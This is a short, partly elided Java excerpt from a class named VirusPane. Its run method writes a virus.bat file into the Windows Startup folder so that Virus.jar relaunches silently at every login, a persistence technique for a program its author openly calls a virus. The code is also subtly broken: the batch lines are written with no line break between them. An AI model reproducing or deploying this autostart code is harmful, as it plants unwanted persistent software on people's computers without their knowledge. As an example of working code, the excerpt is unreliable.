...
public class VirusPane extends JPanel implements KeyListener, Runnable {
    ...
    public void run() {
        ...
        String userHome = "";
        try{
            userHome = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            File batFile = new File(userHome+"\\virus.bat");
            BufferedWriter writer = new BufferedWriter(new FileWriter(batFile));
            writer.write("@echo off");
            writer.write("javaw -Xmx200m -jar "+System.getProperty("user.dir")+"\\Virus.jar");
            writer.close();
        }catch(Exception e){
            e.printStackTrace();
        }
